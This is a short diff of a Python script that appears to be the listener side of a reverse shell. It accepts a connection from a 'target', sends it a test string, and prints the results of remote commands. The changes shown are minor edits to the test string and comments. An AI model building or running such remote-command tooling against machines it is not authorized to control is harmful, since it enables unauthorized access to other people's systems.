@@ -19,7 +19,7 @@ def handle_sock(port):
     conn, addr = s.accept()
     print("Connected to target: {}".format(addr[0]))
     #test = "Get this??".encode()
-    test = "\x00".encode()
+    test = "test".encode()
     conn.send(test)
     while True:
         # This opens the socket up for taking in connections
@@ -32,10 +32,10 @@ def handle_sock(port):
         if command.lower() == "exit":
             conn.close()
             s.close()
-
         # Add the cd functionality
         # Receive command results here:
         result = conn.recv(1024).decode()
+        # Decodes the end result of command and then returns what we need to see
         print(result)
 
 
